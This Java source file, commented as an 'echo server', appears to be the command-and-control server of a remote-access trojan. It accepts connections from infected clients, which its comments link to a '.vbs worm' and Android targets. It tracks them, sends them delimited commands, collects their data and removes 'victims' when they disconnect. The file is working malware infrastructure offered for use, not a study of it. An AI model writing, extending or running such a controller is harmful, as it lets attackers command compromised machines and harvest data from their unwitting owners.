package New;


//echo server
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Scanner;
import java.util.stream.Collectors;
import java.util.zip.GZIPInputStream;

import javax.jws.Oneway;
import javax.swing.ImageIcon;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JProgressBar;

//Program Owner : SaherBlueEagle

public class Server_X_Client implements Runnable{
	public static ArrayList<Socket> Clients_list = new ArrayList<Socket>();
	private static String uport ="";
	public Server_X_Client(String string) {
		uport=string;
	}
	public static void Set_uport(String i){
		uport=i;
	}
	private static boolean isNumeric(String strNum) {
	    try {
	        double d = Double.parseDouble(strNum);
	    } catch (NumberFormatException | NullPointerException nfe) {
	        return false;
	    }
	    return true;
	}
	  public  static String get_IP (String inetaddr){
	    	String ipx = "";
	    	 for (char a : inetaddr.toCharArray()) 
	             if (a!=':'){
	            	 ipx = ipx + a ;
	             }else{
	            	 break;
	             }
	    	return ipx;
	    }
   public static void Remove_Client(Socket s){
	   if (Clients_list.contains(s)){
		   Clients_list.remove(s);
		   String ip= s.getRemoteSocketAddress().toString().replace("/","");
		   System.out.println("Removed : " + ip);
	   }
	  
   }
   public static Socket Return_S(String sock){
	//   System.out.println("Searching : " + sock);
	   Socket s = null;
	   for (Socket ss : Clients_list){

		   String ip= ss.getRemoteSocketAddress().toString().replace("/","");
		   if (ip.contains(sock)){
			 
			   s = ss;
			   sock = null;
			   break;
		   }
	   }
	   
	   return s;
   }
 public static void Send_To_android(String D,String sock) throws IOException{
	   
	   if (Return_S(sock) != null){
		   Socket temp_s = Return_S(sock);
		  	String Exe_Split = "fxf0x4x4x0fxf";
	    	String Exe_Ending = "c2x2824x828200x0c";
	    	String Jar_Split = "fxf0x4x4x0fxf";
	    	String Jar_Ending = "c2x2824x828200x0c";
	    	//ObjectOutputStream tObjInStream = new ObjectOutputStream(temp_s.getOutputStream());  
	   	 System.out.println("here" + Exe_Ending+D+Exe_Ending + sock);
	        
	   //	tObjInStream.writeBytes(Exe_Ending+D+Exe_Ending);
	   	//tObjInStream.flush();
	   	 
		   PrintWriter  os=new PrintWriter(temp_s.getOutputStream());
		
			os.print(' '+Exe_Ending+D+Exe_Ending);
	       os.flush();
	      
	       
	      sock = null;
	   }
	  
   }
   public static void Send_To_client(String D,String sock) throws IOException{
	   
	   if (Return_S(sock) != null){
		   Socket temp_s = Return_S(sock);
		 	String Exe_Split = "fxf0x4x4x0fxf";
	    	String Exe_Ending = "c2x2824x828200x0c";
	    	String Jar_Split = "fxf0x4x4x0fxf";
	    	String Jar_Ending = "c2x2824x828200x0c";
		   PrintWriter  os=new PrintWriter(temp_s.getOutputStream());
		 
		   os.println(Exe_Ending+D+Exe_Ending);
	       os.flush();
	       sock = null;
	   }
	  
   }
   public static void Send_To_client_Vbs(String D,String sock) throws IOException{
	   if (Return_S(sock) != null){
		   Socket temp_s = Return_S(sock);
		   D = D + "qiQqi";
           SimpleDateFormat format = new SimpleDateFormat("EEE, d MMM yyyy HH:mm:Ss z");
		  PrintWriter  os=new PrintWriter(temp_s.getOutputStream());
 
		   String Combination = "";
		   int i = 0;
		  
		   System.out.println("#############################################");
		   //for (Object co : is.lines().toArray()){
			 // Combination = Combination + (String)co;
		  // }
		  
		   String httpResponse = "GET /ready HTTP/1.1\n"
				   				+"Host: " + sock + "\n"
				   				+"Content-Type: application/x-www-form-urlencoded\n"
				   				+"Content-Length: 27\n"
				   				+ "uns" + "qiQqi" ;

    
		   
		   
		   
		   
		   
		   
		   
		   String HEADER = "POST HTTP/1.1 200 OK\n" +
				   "Cache-Control: private\n" +
				   "Content-Type: text/html; charset=utf-8\n" +
				   "Expires: Sun, 21 Feb 2100 20:39:08 GMT\n" +
				   "Server: Microsoft-IIS/7.5\n" +
				   "Date: Sun, 21 Apr 2012 20:39:07 GMT\n" +
				   "Connection: close\n" +
				   "Content-Length: 10\n";
		   //os.write(res.getBytes());
			//out.flush();
		   System.out.println(Combination);
		   System.out.println("#############################################");
		   os.println(D);
		   //os.write(D);
		   //temp_s.getOutputStream().write(HEADER.getBytes("UTF-8"));
	       os.flush();
		   os.close();
		   
	   }
	  
   }
   
	public static void Start_server(String uport) throws IOException{
		int port = 0;
	    Socket s=null;
	    ServerSocket ss2=null;
	    String sock = "ip";
	    try{
	    	String port_entry;
	    	port_entry = uport  ;
	    	JFrame form = new JFrame();
	    	 form.setResizable(false);
	    	 form.setAlwaysOnTop(true);
			 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
			 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
		 
			 form.setBounds((widthx -370)/2,( heightx -500)/2, 370, 500);
			  form.setLayout(null);
			
		      JLabel background=new JLabel( new ImageIcon(Master.class.getResource("/some_icons/bk.png")));
		      background.setBounds(-310,20,990,520);
		      background.setLayout(new FlowLayout());
		 
		      JProgressBar progress = new  JProgressBar();
			  	progress.setBounds(5,475,360,20);
				progress.setBackground(form.getBackground());
				progress.setMaximum(100);
				progress.setFont(new Font("Microsoft Sans Serif", Font.PLAIN, 18));
				
				 form.setUndecorated(true);
		      
				
				
		      form.add(background);

		     
		     
		   form.add(progress);
			
			
			
			form.setBackground(new Color(0,0,0,0));
		       background.setVisible(true);
		       progress.setVisible(true);
		      form.setVisible(true);
		      
	    	int i =0;
	    	while (i<101){
	    		 
		           try {
		        	   progress.setValue(i);
		        	   Thread.sleep(20);
				} catch (Exception e) {
					
				}
		           progress.validate();
		           form.repaint();
		         
		           i+=1;
	    	}
	 
	    	if (i==101){
	    	   	form.setVisible(false);
	    	   	String d="Port Entry " + "For Current User : " + port_entry;
	    	   	JOptionPane optionPane = new JOptionPane(d);
	    	   	optionPane.setInitialValue(port_entry.trim());
	    	   	Object[]x = {"ok"};
	    	    optionPane.setInputValue(x);
	    
	    	  	optionPane.setInitialValue(x);
	    	 	optionPane.setValue(x);
	    		optionPane.repaint();
	    			  	optionPane.setWantsInput(true);
	    		
	    			port_entry = 	optionPane.showInputDialog(form, d, port_entry);//(String) optionPane.getInputValue() ; 
	    	if (isNumeric(port_entry)){
	    	port = Integer.parseInt(port_entry);
	    	 System.out.println("Server Port Set to ...... Port : " + port);
	    	}else{
	    		  MessageBox MessageBox =  new MessageBox();
	    		  MessageBox.infoBox("Cannot Listen to Port : " + port_entry + "\n" + "The Entered value is String","PORT Error");
	    		  System.exit(0);
	    	}
	        ss2 = new ServerSocket(port); // can also use static final PORT_NUM , when defined
	      
	    
	    	ss2.setReceiveBufferSize(999999999);
	    	ss2.setSoTimeout(25000000);
	        System.out.println("Server Listening...... Port : " + port);
	    	}
	    
	    }
	    catch(IOException e){  
	    	MessageBox MessageBox =  new MessageBox();
	    		  MessageBox.infoBox("Cannot Listen to Port : Null "   + "\n" + "The Entered value is String","PORT Error");
	    		  System.exit(0);
	    	
	    e.printStackTrace();
	    System.out.println("Server error");

	    }
	    
	    Master.Do_frame();
	    while(true){
	    		
	            s= ss2.accept();
	            if(s.isConnected()){
	            
	            	   String ip= s.getRemoteSocketAddress().toString().replace("/","");
	   	            System.out.println(ip);
	   	            
	   	            if (Return_S(ip)==null){
	   	            	if(Clients_list.contains(s)){
	   	            		 
	   	            	}
	   	            	Clients_list.add(s);
	   	            	 ServerThread st=new ServerThread(s);
	   	 	            st.start();
	   	         }
	   	 	            if (Master.is_listening == false){
	   	 	            	Master.is_listening  = true;
	   	 	            }
	   	            }
	         
	         
	         
	    }

	}

	@Override
	public void run() {
	 
		 System.out.println("I Called SuccessFully , Iam in Run");
		try {
			
			Start_server(uport);
			  System.out.println("I Called SuccessFully m Iam in Try");
		} catch (Exception e) {}
	}


}

class ServerThread extends Thread{  
	private ObjectInputStream tObjInStream;
	private String line=null;
	private BufferedReader  is = null;
	private PrintWriter os=null;
	private Socket s=null;
	private InputStream client_s = null;
	private String sock = "ip";
	private String string_to_send="nothing";
	private String curr_ip = "";
    public  String get_IP (String inetaddr){
    	String ipx = "";
    	 for (char a : inetaddr.toCharArray()) 
             if (a!=':'){
            	 ipx = ipx + a ;
             }else{
            	 break;
             }
    	return ipx;
    }
    public ServerThread(Socket s) throws IOException{
        this.s=s;
       // s.setSendBufferSize(9999999);
       // s.setReceiveBufferSize(9999999);
        String ip= s.getRemoteSocketAddress().toString().replace("/","");
        this.setPriority(MAX_PRIORITY);
        this. sock = get_IP(ip);
        curr_ip = sock;
        
         
    }
    public String get_sock(){
    	return sock;
    }
    public  byte[] dZp(byte[] d) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        final int buff = d.length;
        ByteArrayInputStream in = new ByteArrayInputStream(d);
        GZIPInputStream g = new GZIPInputStream(in, buff);
        byte[] b = new byte[buff];
        int cu;
        while ((cu = g.read(b)) != -1) {
            o.write(b, 0, cu);
        }
        g.close();
        in.close();
        byte[] e = o.toByteArray();
        o.close();
        return e;
    }
    public void run() {
    	
    try{
    	client_s = s.getInputStream();
        is= new BufferedReader(new InputStreamReader(client_s));
        os=new PrintWriter(s.getOutputStream());

    }catch(IOException e){
        System.out.println("IO error in server thread");
    }

    try {
    	String Http_Split = "qiQqi";
    	String Exe_Split = "fxf0x4x4x0fxf";
    	String Exe_Ending = "c2x2824x828200x0c";
    	String Jar_Split = "fxf0x4x4x0fxf";
    	String Jar_Ending = "c2x2824x828200x0c";
    	 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		
	     // os.write("x0F0x"+"x0D0x"+"x0L0x");
    	os.write(Exe_Ending+"info" + Exe_Split + Exe_Ending );
        os.flush();
        
   try{
	   while(true){
		 try{
			 
			  tObjInStream = new ObjectInputStream(client_s);  
			  Master.Raise_Data(tObjInStream.readUTF(), sock);
			  System.out.println("working");
		 } catch (Exception e){ //Handle VB connections 
			  System.out.println("ex:" + e.getMessage());
			  while(true){
				  try{
						 
						 StringBuilder content = new StringBuilder();
					        boolean fail = false;
						    int value;
						    int counter = 0;
						    while (true) {
						    	 try{
						    	value = is.read();
						    	//System.out.println("working" +value);
						    	
						        content.append((char) value);
								 
									
						    	 } catch (Exception e2){
						    			System.out.println("sss"+e2.getMessage() );
						    			if(e2.getMessage().contains("Connection rese")){
						    				fail = true;
								    		break;
						    			}
						    		
						    	 }
						    	 if (is.ready()==false){
						    		  	break;
							    	}
						     
						    	
						    	 counter +=1;
						    	 
						    }
						    if(fail==true){
						    	Master.Del_Victim("", sock);
						    	break;
						    }
						 //System.out.println("\nhereddd" );
						 Master.Raise_Data(content.toString() , sock);
						 //System.out.println("\n" + content.toString() );
						 //  Master.Raise_Data(tObjInStream.readUTF(), sock);
					
					    
					 } catch (Exception exx){}
			  }
		 /*
			   while(true){
				   try{
					       if (line.contains(YY) ||line.contains(YY)){
					    	   line = line.replace(YY, Exe_Ending);
					       }  
					    
					   if (line.contains(Exe_Split) ||line.contains(Exe_Ending)){ //qiQqi is split string in .vbs worm
						  // System.out.println("Client  :  " + sock + " .... Sent : " +line);
		            	     Master.Raise_Data(line, sock);
		            	     line=is.readLine();
		        		   }else if (line.contains(Jar_Split) ||line.contains(Jar_Ending)){ //qiQqi is split string in .vbs worm
		        			   Master.Raise_Data(line, sock);
		        		 	   line=is.readLine();
		        		   }else{
		        
		            	    continue;
		        	    	  }
				   }catch (Exception ex){
					   line=this.getName(); //reused String line for getting thread name
				        System.out.println("IO Error/ Client "+line+" terminated abruptly");
				        Master.Del_Victim("", sock);
					   break;
				 
				   }
					
	   
	       
	        
	        
			   }*/
			   break;
		 }
			 
		    
		 
	   }
        
   } catch (Exception e){
	     
	   
   }
        		
  
      //** line = is.readLine();
         
         //String s = is.lines().collect((Collectors.joining("\n")));
        	//**	   while (true){
        	
        	//(line.compareTo("QUIT")!=0){
        	   //System.out.println("Client  :  " + sock + " .... Sent : " +line);
        	/*if (line.contains("isendfile")){
        		 System.out.println("file  :  " + sock + " .... xxx : " +line);
  	      }*/
        	
        //	new MessageBox().infoBox(line, "AAA");
        	 /*   if (line.contains(YY) ||line.contains(YY)){
        		   line = line.replace(YY, Exe_Ending);
        	   }  */
        	// sock = curr_ip;
          /*if (line.contains(Http_Split)== true || line.contains("HTTP")
        		  || line.contains("Accept") || line.contains("POST /")
        		  || line.contains("UA-CPU")|| line.contains("Host")
        		  || line.contains("Content")  || line.contains("Connection: Keep-Aliv") 
        		  || line.contains("ache-Control: no-cache")
        		  )
          
          { //qiQqi is split string in .vbs worm
        	
        		
        		
        		  if (line.contains(Http_Split)== true || line.contains("HTTP/1.1")
                		  || line.contains("User-Agent") || line.contains("POST /")
                		  ){ //qiQqi is split string in .vbs worm
                	Master.Raise_Data_vbs(line, sock);
                	  if(line.length()> 3){
              			System.out.println("Client  :  "   + line);
                	  }
              
                   }
        		  line=is.readLine();
        	//	
        	
           }else*/ 
        		  
        		//**  if (line.contains(Exe_Split) ||line.contains(Exe_Ending)){ //qiQqi is split string in .vbs worm
            	//**    Master.Raise_Data(line, sock);
        	 	  //**   line=is.readLine();
        		 //**  }else if (line.contains(Jar_Split) ||line.contains(Jar_Ending)){ //qiQqi is split string in .vbs worm
        	
        	    	//**	  Master.Raise_Data(line, sock);
        		 	//**   line=is.readLine();
        		 //**   }else{
        
            	//**   	    	 	    continue;
        	    	 	 //**		    }
   
             //System.out.println("Client  :  " + sock + " .... Sent : " +line);
        
           //**    }   
    } catch (Exception e) {

        line=this.getName(); //reused String line for getting thread name
        System.out.println("IO Error/ Client "+line+" terminated abruptly");
        Master.Del_Victim("", sock);
    }
    /*catch(NullPointerException e){
        line=this.getName(); //reused String line for getting thread name
        System.out.println("Client "+line+" Closed");
        Master.Del_Victim("", sock);
    }*/

    finally{    
    try{
        System.out.println("Connection Closing..");
        if (is!=null){
            is.close(); 
          
            System.out.println(" Socket Input Stream Closed");
            Master.Del_Victim("", sock);
            Server_X_Client.Remove_Client(s);
        }

        if(os!=null){
            os.close();
            System.out.println("Socket Out Closed");
            Master.Del_Victim("", sock);
            Server_X_Client.Remove_Client(s);
        }
        if (s!=null){
        s.close();
        System.out.println("Socket Closed");
        Master.Del_Victim("", sock);
        Server_X_Client.Remove_Client(s);
        }

        }
    catch(IOException ie){
        System.out.println("Socket Close Error");
    }
    }//end finally
    }
}

class MessageBox
{

    public void infoBox(final String infoMessage, final String titleBar)
    {Thread t = new Thread(new Runnable(){
        public void run(){
            JOptionPane.showMessageDialog(null, infoMessage, titleBar, JOptionPane.INFORMATION_MESSAGE);
        }
    });
  t.start();

    }
    public static void errorBox_nothread(final String infoMessage, final String titleBar)

    {
            JOptionPane.showMessageDialog(null, infoMessage, titleBar, JOptionPane.ERROR_MESSAGE);
     



    } //Program Owner : SaherBlueEagle

}
